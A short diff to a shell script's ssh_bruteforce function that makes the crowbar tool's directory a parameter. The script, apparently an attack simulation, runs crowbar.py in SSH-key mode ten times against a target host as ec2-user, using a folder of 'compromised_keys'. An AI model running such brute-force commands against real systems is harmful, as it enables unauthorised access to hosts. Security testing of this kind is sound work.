@@ -16,6 +16,7 @@
 function ssh_bruteforce {
 
 KEYS_PATH=$1/compromised_keys
+CROWBAR_DIR=$2
 
 if [[ -d "$KEYS_PATH" ]]; then 
 
@@ -35,7 +36,7 @@ echo '***********************************************************************'
 echo
 for j in `seq 1 10`;
 do
-	sudo ./crowbar/crowbar.py -b sshkey -s $BASIC_LINUX_TARGET/32 -u ec2-user -k $KEYS_PATH;
+	sudo $CROWBAR_DIR/crowbar.py -b sshkey -s $BASIC_LINUX_TARGET/32 -u ec2-user -k $KEYS_PATH;
 done
 echo
 echo '-----------------------------------------------------------------------'
